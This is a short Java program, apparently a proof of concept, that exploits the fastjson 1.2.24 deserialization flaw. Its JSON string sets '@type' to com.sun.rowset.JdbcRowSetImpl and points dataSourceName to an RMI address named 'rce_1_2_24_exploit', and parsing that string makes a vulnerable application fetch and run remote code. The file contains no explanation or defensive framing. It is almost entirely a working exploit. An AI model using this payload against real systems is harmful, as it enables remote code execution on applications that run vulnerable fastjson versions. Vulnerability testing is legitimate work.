import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        String jsonString = "{\n" +
                "\t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "\t\"dataSourceName\":\"rmi://192.168.0.120:9999/rce_1_2_24_exploit\",\n" +
                "\t\"autoCommit\":true\n" +
                "    }";
        Object obj = JSON.parseObject(jsonString, Object.class, config, Feature.SupportNonPublicField);
    }
}
